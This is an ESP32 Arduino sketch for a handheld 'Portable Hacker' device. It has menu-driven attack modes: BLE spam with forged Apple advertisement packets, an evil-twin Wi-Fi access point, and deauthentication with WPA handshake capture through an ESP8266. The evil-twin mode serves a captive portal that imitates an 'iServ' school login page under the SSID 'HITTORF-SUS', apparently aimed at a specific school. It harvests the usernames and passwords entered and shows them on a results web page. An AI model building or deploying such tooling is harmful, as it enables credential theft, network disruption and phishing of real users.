#include <Wire.h>
#include <WiFi.h>
#include <WebServer.h>
#include <SPIFFS.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <ESP32Encoder.h>
#include <DNSServer.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// ==================== PINS ====================
const int encoderPinA = 32;
const int encoderPinB = 33;
const int encoderButton = 25;
const int batteryPin = 34;

ESP32Encoder encoder;
long lastEncoderPosition = 0;
bool lastButtonState = HIGH;
unsigned long lastDebounceTime = 0;
unsigned long lastActivityTime = 0;
const int debounceDelay = 50;
const int inactivityTimeout = 10000; // 10 seconds
bool buttonPressed = false;
unsigned long buttonPressTime = 0;

enum Screen {
  BOOT_SCREEN,
  HOME_SCREEN,
  BLE_SPAM_SCREEN,
  TWIN_SCREEN,
  DEAUTH_SCREEN,
  DEAUTH_NETWORK_SELECT,
  DEAUTH_MODE_SELECT,
  DEAUTH_CAPTURE_SCREEN,
  DEAUTH_RESULTS_SCREEN,
  SETTINGS_SCREEN,
  BATTERY_SCREEN,
  WEB_SERVER_SCREEN,
  SHUTDOWN_SCREEN,
  SLEEP_SCREEN
};

Screen currentScreen = BOOT_SCREEN;
Screen previousScreen = HOME_SCREEN;

bool systemAwake = true;
unsigned long sleepStartTime = 0;
RTC_DATA_ATTR int bootCount = 0;

String homeMenuItems[] = {
  "BLE Spam",
  "Twin Attack",
  "D-Auth",
  "Settings",
  "Battery",
  "Shutdown"
};
const int HOME_MENU_COUNT = 6;
int selectedHomeItem = 0;

bool twinActive = false;
const char* TWIN_SSID = "HITTORF-SUS";
DNSServer dnsServer;
WebServer webServer(80);
IPAddress apIP(172, 217, 28, 1);
String capturedCredentials[10];
int credentialCount = 0;

BLEAdvertising *pAdvertising = nullptr;
bool bleSpamming = false;

bool deauthActive = false;
String deauthNetworks[20];
int deauthNetworkCount = 0;
int selectedDeauthNetwork = 0;
int selectedDeauthMode = 0; // 0=Single, 1=Double, 2=Multiple
String deauthModes[] = {"Single", "Double", "Multiple"};
String capturedHandshakes[20];
int handshakeCount = 0;

String settingsMenuItems[] = {
  "Invert Display",
  "Show Raw Voltage",
  "WiFi AP Settings",
  "Back"
};
const int SETTINGS_MENU_COUNT = 4;
int selectedSettingsItem = 0;
bool invertDisplay = false;
bool showRawVoltage = true;

#define RXp2 16
#define TXp2 17
HardwareSerial SerialESP8266(2);
String serialBuffer = "";
bool waitingForResponse = false;
unsigned long responseTimeout = 0;

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  bootCount++;
  
  Wire.begin(21, 22);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println("SSD1306 init failed");
    while (true);
  }
  
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.println("Initializing...");
  display.display();
  
  // Initialize encoder
  ESP32Encoder::useInternalWeakPullResistors = puType::up;
  encoder.attachHalfQuad(encoderPinA, encoderPinB);
  encoder.setCount(0);
  pinMode(encoderButton, INPUT_PULLUP);
  
  // Battery
  analogReadResolution(12);
  
  // SPIFFS
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS init failed");
  }
  
  // Serial communication with ESP8266
  SerialESP8266.begin(115200, SERIAL_8N1, RXp2, TXp2);
  
  lastActivityTime = millis();
  currentScreen = BOOT_SCREEN;
  bootScreen();
  
  currentScreen = HOME_SCREEN;
}

void loop() {
  handleInactivity();
  
  if (systemAwake) {
    handleEncoder();
    handleButton();
    handleSerialCommunication();
    drawCurrentScreen();
  }
  
  delay(30);
}

void handleInactivity() {
  if (systemAwake && (millis() - lastActivityTime) > inactivityTimeout) {
    if (currentScreen != DEAUTH_CAPTURE_SCREEN && currentScreen != WEB_SERVER_SCREEN) {
      systemAwake = false;
      display.clearDisplay();
      display.setTextSize(2);
      display.setCursor(10, 25);
      display.println("Going to");
      display.setCursor(20, 45);
      display.println("Sleep");
      display.display();
      delay(1000);
      display.clearDisplay();
      display.display();
      esp_deep_sleep_start();
    }
  }
}

void wakeUp() {
  lastActivityTime = millis();
  systemAwake = true;
}

void handleEncoder() {
  long encoderPosition = encoder.getCount() / 2;
  
  if (encoderPosition != lastEncoderPosition) {
    bool turnedRight = encoderPosition > lastEncoderPosition;
    lastActivityTime = millis();
    
    switch (currentScreen) {
      case HOME_SCREEN:
        if (turnedRight) {
          selectedHomeItem = (selectedHomeItem + 1) % HOME_MENU_COUNT;
        } else {
          selectedHomeItem = (selectedHomeItem - 1 + HOME_MENU_COUNT) % HOME_MENU_COUNT;
        }
        break;
      
      case DEAUTH_NETWORK_SELECT:
        if (turnedRight) {
          selectedDeauthNetwork = (selectedDeauthNetwork + 1) % deauthNetworkCount;
        } else {
          selectedDeauthNetwork = (selectedDeauthNetwork - 1 + deauthNetworkCount) % deauthNetworkCount;
        }
        break;
      
      case DEAUTH_MODE_SELECT:
        if (turnedRight) {
          selectedDeauthMode = (selectedDeauthMode + 1) % 3;
        } else {
          selectedDeauthMode = (selectedDeauthMode - 1 + 3) % 3;
        }
        break;
      
      case SETTINGS_SCREEN:
        if (turnedRight) {
          selectedSettingsItem = (selectedSettingsItem + 1) % SETTINGS_MENU_COUNT;
        } else {
          selectedSettingsItem = (selectedSettingsItem - 1 + SETTINGS_MENU_COUNT) % SETTINGS_MENU_COUNT;
        }
        break;
    }
    
    lastEncoderPosition = encoderPosition;
  }
}

void handleButton() {
  bool buttonState = digitalRead(encoderButton);
  
  if (buttonState != lastButtonState) {
    lastDebounceTime = millis();
  }
  
  if ((millis() - lastDebounceTime) > debounceDelay) {
    // Button pressed
    if (buttonState == LOW && lastButtonState == HIGH) {
      lastActivityTime = millis();
      buttonPressed = true;
      buttonPressTime = millis();
    }
    // Button released
    else if (buttonState == HIGH && lastButtonState == LOW) {
      unsigned long pressDuration = millis() - buttonPressTime;
      
      if (pressDuration > 2000) { // Long press
        handleLongPress();
      } else { // Short press
        handleShortPress();
      }
      
      buttonPressed = false;
    }
  }
  
  lastButtonState = buttonState;
}

void handleShortPress() {
  switch (currentScreen) {
    case HOME_SCREEN:
      handleHomeMenuSelect();
      break;
    
    case BLE_SPAM_SCREEN:
      if (bleSpamming) {
        stopBLESpam();
      } else {
        startBLESpam();
      }
      break;
    
    case TWIN_SCREEN:
      if (twinActive) {
        stopTwinAttack();
      } else {
        startTwinAttack();
      }
      break;
    
    case DEAUTH_SCREEN:
      currentScreen = HOME_SCREEN;
      break;
    
    case DEAUTH_NETWORK_SELECT:
      selectedDeauthMode = 0;
      currentScreen = DEAUTH_MODE_SELECT;
      break;
    
    case DEAUTH_MODE_SELECT:
      startDeauthAttack();
      break;
    
    case DEAUTH_CAPTURE_SCREEN:
      // Capturing - press to stop
      stopDeauthAttack();
      break;
    
    case WEB_SERVER_SCREEN:
      stopWebServer();
      break;
    
    case SETTINGS_SCREEN:
      handleSettingsSelect();
      break;
    
    case BATTERY_SCREEN:
      currentScreen = HOME_SCREEN;
      break;
  }
}

void handleLongPress() {
  // Long press = Shutdown
  currentScreen = SHUTDOWN_SCREEN;
  drawShutdownScreen();
  delay(3000);
  esp_deep_sleep_start();
}

void handleHomeMenuSelect() {
  switch (selectedHomeItem) {
    case 0: // BLE Spam
      currentScreen = BLE_SPAM_SCREEN;
      break;
    case 1: // Twin Attack
      currentScreen = TWIN_SCREEN;
      break;
    case 2: // D-Auth
      currentScreen = DEAUTH_SCREEN;
      // Wake ESP8266
      SerialESP8266.println("WAKE");
      delay(100);
      // Request network list
      SerialESP8266.println("SCAN");
      waitingForResponse = true;
      responseTimeout = millis() + 5000;
      break;
    case 3: // Settings
      currentScreen = SETTINGS_SCREEN;
      break;
    case 4: // Battery
      currentScreen = BATTERY_SCREEN;
      break;
    case 5: // Shutdown
      currentScreen = SHUTDOWN_SCREEN;
      drawShutdownScreen();
      delay(3000);
      esp_deep_sleep_start();
      break;
  }
}

void handleSettingsSelect() {
  switch (selectedSettingsItem) {
    case 0:
      invertDisplay = !invertDisplay;
      display.invertDisplay(invertDisplay);
      break;
    case 1:
      showRawVoltage = !showRawVoltage;
      break;
    case 3: // Back
      currentScreen = HOME_SCREEN;
      break;
  }
}

void handleSerialCommunication() {
  while (SerialESP8266.available()) {
    char c = SerialESP8266.read();
    if (c == '\n') {
      processSerialMessage(serialBuffer);
      serialBuffer = "";
    } else if (c != '\r') {
      serialBuffer += c;
    }
  }
  
  // Check for timeout
  if (waitingForResponse && millis() > responseTimeout) {
    waitingForResponse = false;
  }
}

void processSerialMessage(String message) {
  Serial.println("RX: " + message);
  
  if (message.startsWith("NETWORKS:")) {
    // Parse network list
    deauthNetworkCount = 0;
    int startIdx = 9;
    int endIdx = message.indexOf(",", startIdx);
    
    while (endIdx > 0 && deauthNetworkCount < 20) {
      deauthNetworks[deauthNetworkCount] = message.substring(startIdx, endIdx);
      deauthNetworkCount++;
      startIdx = endIdx + 1;
      endIdx = message.indexOf(",", startIdx);
    }
    
    if (startIdx < message.length()) {
      deauthNetworks[deauthNetworkCount] = message.substring(startIdx);
      deauthNetworkCount++;
    }
    
    currentScreen = DEAUTH_NETWORK_SELECT;
    selectedDeauthNetwork = 0;
    waitingForResponse = false;
  }
  else if (message.startsWith("HANDSHAKE:")) {
    // Received handshake
    if (handshakeCount < 20) {
      capturedHandshakes[handshakeCount] = message.substring(10);
      handshakeCount++;
    }
  }
  else if (message.startsWith("DEAUTH_DONE")) {
    // Deauth complete
    currentScreen = DEAUTH_RESULTS_SCREEN;
  }
}

void startBLESpam() {
  if (bleSpamming) return;
  
  BLEDevice::init("");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  
  bleSpamming = true;
  Serial.println("BLE Spam Started");
}

void stopBLESpam() {
  if (pAdvertising) {
    pAdvertising->stop();
  }
  bleSpamming = false;
  Serial.println("BLE Spam Stopped");
}

void updateBLESpam() {
  if (!bleSpamming || !pAdvertising) return;
  
  uint8_t devices[][2] = {
    {0x02, 0x01}, {0x0f, 0x19}, {0x13, 0x19},
    {0x05, 0x19}, {0x0b, 0x19}, {0x07, 0x19},
    {0x14, 0x19}, {0x03, 0x19}, {0x0c, 0x19}
  };
  
  for (int i = 0; i < 9; i++) {
    uint8_t packet[31];
    packet[0] = 0x1e;
    packet[1] = 0xff;
    packet[2] = 0x4c;
    packet[3] = 0x00;
    packet[4] = 0x07;
    packet[5] = 0x19;
    packet[6] = 0x07;
    packet[7] = 0x02;
    packet[8] = 0x20;
    packet[9] = devices[i][0];
    packet[10] = devices[i][1];
    
    for (int j = 11; j < 31; j++) {
      packet[j] = random(256);
    }
    
    BLEAdvertisementData oData;
    std::string packetStr((char*)packet, 31);
    oData.addData(packetStr);
    pAdvertising->setAdvertisementData(oData);
    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->start();
    delay(100);
    pAdvertising->stop();
    delay(5);
  }
}

void startTwinAttack() {
  if (twinActive) return;
  
  // Setup AP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(TWIN_SSID);
  
  // Setup DNS
  dnsServer.start(53, "*", apIP);
  
  // Setup Web Server
  setupCaptivePortal();
  webServer.begin();
  
  twinActive = true;
  credentialCount = 0;
  
  // Wake ESP8266 for deauth
  SerialESP8266.println("WAKE");
  delay(100);
  SerialESP8266.println("SCAN");
  
  Serial.println("Twin Attack Started");
}

void stopTwinAttack() {
  WiFi.softAPdisconnect(true);
  dnsServer.stop();
  webServer.stop();
  
  twinActive = false;
  Serial.println("Twin Attack Stopped");
  
  currentScreen = HOME_SCREEN;
}

void setupCaptivePortal() {
  webServer.on("/", HTTP_GET, []() {
    webServer.send(200, "text/html", getCaptivePortalHTML());
  });
  
  webServer.on("/hotspot-detect.html", HTTP_GET, []() {
    webServer.send(200, "text/html", getCaptivePortalHTML());
  });
  
  webServer.on("/generate_204", HTTP_GET, []() {
    webServer.send(200, "text/html", getCaptivePortalHTML());
  });
  
  webServer.on("/login", HTTP_POST, []() {
    String username = webServer.arg("u");
    String password = webServer.arg("p");
    
    if (credentialCount < 10) {
      capturedCredentials[credentialCount] = username + ":" + password;
      credentialCount++;
    }
    
    Serial.println("Credentials captured: " + username + " / " + password);
    webServer.send(200, "text/html", "<h1>Error</h1><p>Connection failed</p>");
  });
  
  webServer.onNotFound([]() {
    webServer.sendHeader("Location", "/");
    webServer.send(302, "text/plain", "");
  });
}

String getCaptivePortalHTML() {
  String html = F("<!DOCTYPE html><html lang='de'><head>");
  html += F("<meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>");
  html += F("<style>");
  html += F("body { background-color: #2e2e2e; color: white; font-family: 'Segoe UI', Tahoma, Geneva; margin: 0; text-align: center; }");
  html += F(".header { background-color: #064584; padding: 10px; height: 100px; border-bottom: 4px solid #043566; }");
  html += F(".header h1 { margin: 25px 0 0 0; font-size: 60px; }");
  html += F(".content { max-width: 400px; margin: 40px auto; padding: 20px; }");
  html += F("h2 { font-size: 24px; margin-bottom: 20px; }");
  html += F("input { width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box; background: #1a1a1a; border: 1px solid #555; color: white; border-radius: 4px; }");
  html += F("button { width: 100%; padding: 15px; background-color: #55aaff; color: #003366; border: none; font-size: 16px; font-weight: bold; border-radius: 5px; cursor: pointer; margin-top: 20px; }");
  html += F("</style></head><body>");
  html += F("<div class='header'><h1>iServ</h1></div>");
  html += F("<div class='content'>");
  html += F("<form action='/login' method='POST'><h2>Anmeldung</h2>");
  html += F("<input type='text' name='u' placeholder='Account' required>");
  html += F("<input type='password' name='p' placeholder='Passwort' required>");
  html += F("<button type='submit'>Anmelden</button>");
  html += F("</form></div></body></html>");
  return html;
}

void startDeauthAttack() {
  deauthActive = true;
  handshakeCount = 0;
  currentScreen = DEAUTH_CAPTURE_SCREEN;
  
  // Send deauth command to ESP8266
  String cmd = "DEAUTH:" + deauthNetworks[selectedDeauthNetwork] + ":" + deauthModes[selectedDeauthMode];
  SerialESP8266.println(cmd);
  
  Serial.println("Deauth started: " + cmd);
}

void stopDeauthAttack() {
  deauthActive = false;
  SerialESP8266.println("STOP");
  
  // Start web server for results
  startWebServer();
}

void startWebServer() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("PortableHacker");
  
  webServer.on("/", HTTP_GET, []() {
    String html = "<html><head><style>body{background:#1a1a1a; color:#fff; font-family:Arial;}</style></head><body>";
    html += "<h1>Captured Data</h1>";
    html += "<h2>Handshakes</h2><ul>";
    for (int i = 0; i < handshakeCount; i++) {
      html += "<li>" + capturedHandshakes[i] + "</li>";
    }
    html += "</ul>";
    html += "<h2>Login Data (Twin)</h2><ul>";
    for (int i = 0; i < credentialCount; i++) {
      html += "<li>" + capturedCredentials[i] + "</li>";
    }
    html += "</ul>";
    html += "</body></html>";
    webServer.send(200, "text/html", html);
  });
  
  webServer.begin();
  currentScreen = WEB_SERVER_SCREEN;
}

void stopWebServer() {
  webServer.stop();
  WiFi.softAPdisconnect(true);
  currentScreen = HOME_SCREEN;
}

float getBatteryVoltage() {
  int raw = analogRead(batteryPin);
  float voltage = (raw / 4095.0) * 3.3 * 2.0;
  return voltage;
}

int getBatteryPercent() {
  float voltage = getBatteryVoltage();
  int percent = map(voltage * 100, 330, 420, 0, 100);
  if (percent > 100) percent = 100;
  if (percent < 0) percent = 0;
  return percent;
}

void drawBatteryIcon() {
  int batteryPercent = getBatteryPercent();
  
  display.drawRect(102, 0, 22, 10, SSD1306_WHITE);
  display.fillRect(124, 2, 2, 6, SSD1306_WHITE);
  
  int fillWidth = map(batteryPercent, 0, 100, 0, 18);
  display.fillRect(104, 2, fillWidth, 6, SSD1306_WHITE);
  
  display.setTextSize(1);
  display.setCursor(102, 12);
  display.print(batteryPercent);
  display.println("%");
}

void drawCurrentScreen() {
  switch (currentScreen) {
    case BOOT_SCREEN:
      break; // Already drawn in bootScreen()
    
    case HOME_SCREEN:
      drawHomeScreen();
      break;
    
    case BLE_SPAM_SCREEN:
      drawBLESpamScreen();
      break;
    
    case TWIN_SCREEN:
      drawTwinScreen();
      break;
    
    case DEAUTH_SCREEN:
      drawDeauthLoadingScreen();
      break;
    
    case DEAUTH_NETWORK_SELECT:
      drawNetworkSelectScreen();
      break;
    
    case DEAUTH_MODE_SELECT:
      drawModeSelectScreen();
      break;
    
    case DEAUTH_CAPTURE_SCREEN:
      drawCaptureScreen();
      break;
    
    case DEAUTH_RESULTS_SCREEN:
      drawResultsScreen();
      break;
    
    case SETTINGS_SCREEN:
      drawSettingsScreen();
      break;
    
    case BATTERY_SCREEN:
      drawBatteryDetailScreen();
      break;
    
    case WEB_SERVER_SCREEN:
      drawWebServerScreen();
      break;
  }
}

void bootScreen() {
  display.clearDisplay();
  display.setTextSize(2);
  display.setCursor(5, 5);
  display.println("PORTABLE");
  display.setCursor(15, 25);
  display.println("HACKER");
  display.setTextSize(1);
  display.setCursor(5, 50);
  display.println("Initializing...");
  display.display();
  delay(2000);
}

void drawShutdownScreen() {
  display.clearDisplay();
  display.setTextSize(2);
  display.setCursor(15, 15);
  display.println("SHUTTING");
  display.setCursor(25, 35);
  display.println("DOWN");
  display.setTextSize(1);
  display.setCursor(10, 55);
  display.println("Goodbye!");
  display.display();
}

void drawHomeScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("Menu");
  
  drawBatteryIcon();
  
  for (int i = 0; i < HOME_MENU_COUNT; i++) {
    display.setCursor(0, 15 + (i * 10));
    if (i == selectedHomeItem) {
      display.print("> ");
      display.setTextColor(SSD1306_WHITE);
    } else {
      display.print("  ");
    }
    display.println(homeMenuItems[i]);
  }
  
  display.display();
}

void drawBLESpamScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("BLE Spam");
  drawBatteryIcon();
  
  display.setTextSize(2);
  if (bleSpamming) {
    display.setCursor(15, 25);
    display.println("ACTIVE");
    display.setTextSize(1);
    display.setCursor(10, 50);
    display.println("Press to stop");
  } else {
    display.setCursor(20, 25);
    display.println("IDLE");
    display.setTextSize(1);
    display.setCursor(10, 50);
    display.println("Press to start");
  }
  
  display.display();
  
  if (bleSpamming) {
    updateBLESpam();
  }
}

void drawTwinScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("Twin Attack");
  drawBatteryIcon();
  
  display.setTextSize(1);
  display.setCursor(0, 20);
  display.println("SSID: HITTORF-SUS");
  
  if (twinActive) {
    display.setTextSize(2);
    display.setCursor(20, 35);
    display.println("RUNNING");
    display.setTextSize(1);
    display.setCursor(5, 55);
    display.print("Creds: ");
    display.println(credentialCount);
  } else {
    display.setTextSize(1);
    display.setCursor(20, 35);
    display.println("Press to start");
  }
  
  display.display();
}

void drawDeauthLoadingScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("D-Auth");
  drawBatteryIcon();
  
  display.setTextSize(1);
  display.setCursor(20, 30);
  display.println("Loading...");
  display.setCursor(15, 45);
  display.println("Scanning networks");
  
  // Simple loading animation
  int dots = (millis() / 500) % 4;
  for (int i = 0; i < dots; i++) {
    display.print(".");
  }
  
  display.display();
}

void drawNetworkSelectScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("Select Network");
  drawBatteryIcon();
  
  display.setTextSize(1);
  for (int i = 0; i < 5 && i < deauthNetworkCount; i++) {
    display.setCursor(0, 15 + (i * 10));
    if (i == selectedDeauthNetwork) {
      display.print("> ");
    } else {
      display.print("  ");
    }
    String net = deauthNetworks[i];
    if (net.length() > 20) {
      net = net.substring(0, 17) + "...";
    }
    display.println(net);
  }
  
  display.display();
}

void drawModeSelectScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("Select Mode");
  drawBatteryIcon();
  
  display.setTextSize(1);
  display.setCursor(0, 20);
  display.println("Network:");
  String net = deauthNetworks[selectedDeauthNetwork];
  if (net.length() > 20) net = net.substring(0, 17) + "...";
  display.println(net);
  
  display.setCursor(0, 40);
  for (int i = 0; i < 3; i++) {
    if (i == selectedDeauthMode) {
      display.print("> ");
    } else {
      display.print("  ");
    }
    display.println(deauthModes[i]);
  }
  
  display.display();
}

void drawCaptureScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("Capturing");
  drawBatteryIcon();
  
  display.setTextSize(2);
  int frames = (millis() / 200) % 4;
  String loading = "";
  for (int i = 0; i < frames; i++) loading += "*";
  display.setCursor(30, 20);
  display.println(loading);
  
  display.setTextSize(1);
  display.setCursor(0, 40);
  display.print("Handshakes: ");
  display.println(handshakeCount);
  
  display.setCursor(0, 55);
  display.println("Press to stop");
  
  display.display();
}

void drawResultsScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("Results");
  drawBatteryIcon();
  
  display.setTextSize(1);
  display.setCursor(0, 20);
  display.print("Handshakes: ");
  display.println(handshakeCount);
  
  display.setCursor(0, 35);
  display.println("Opening web server...");
  
  display.display();
}

void drawSettingsScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("Settings");
  drawBatteryIcon();
  
  for (int i = 0; i < SETTINGS_MENU_COUNT; i++) {
    display.setCursor(0, 15 + (i * 10));
    if (i == selectedSettingsItem) {
      display.print("> ");
    } else {
      display.print("  ");
    }
    display.print(settingsMenuItems[i]);
    
    if (i == 0) {
      display.print(": ");
      display.println(invertDisplay ? "ON" : "OFF");
    } else if (i == 1) {
      display.print(": ");
      display.println(showRawVoltage ? "ON" : "OFF");
    } else {
      display.println();
    }
  }
  
  display.display();
}

void drawBatteryDetailScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("Battery");
  
  float voltage = getBatteryVoltage();
  int percent = getBatteryPercent();
  
  display.setTextSize(2);
  display.setCursor(20, 20);
  display.print(percent);
  display.println("%");
  
  display.setTextSize(1);
  display.setCursor(10, 45);
  display.print("Voltage: ");
  display.print(voltage, 2);
  display.println("V");
  
  display.setCursor(10, 55);
  display.println("Press to return");
  
  display.display();
}

void drawWebServerScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("Web Server");
  drawBatteryIcon();
  
  display.setTextSize(1);
  display.setCursor(0, 20);
  display.println("IP: 172.217.28.1");
  
  display.setCursor(0, 35);
  display.print("Handshakes: ");
  display.println(handshakeCount);
  
  display.setCursor(0, 45);
  display.print("Twin Creds: ");
  display.println(credentialCount);
  
  display.setCursor(0, 55);
  display.println("Press to close");
  
  display.display();
}
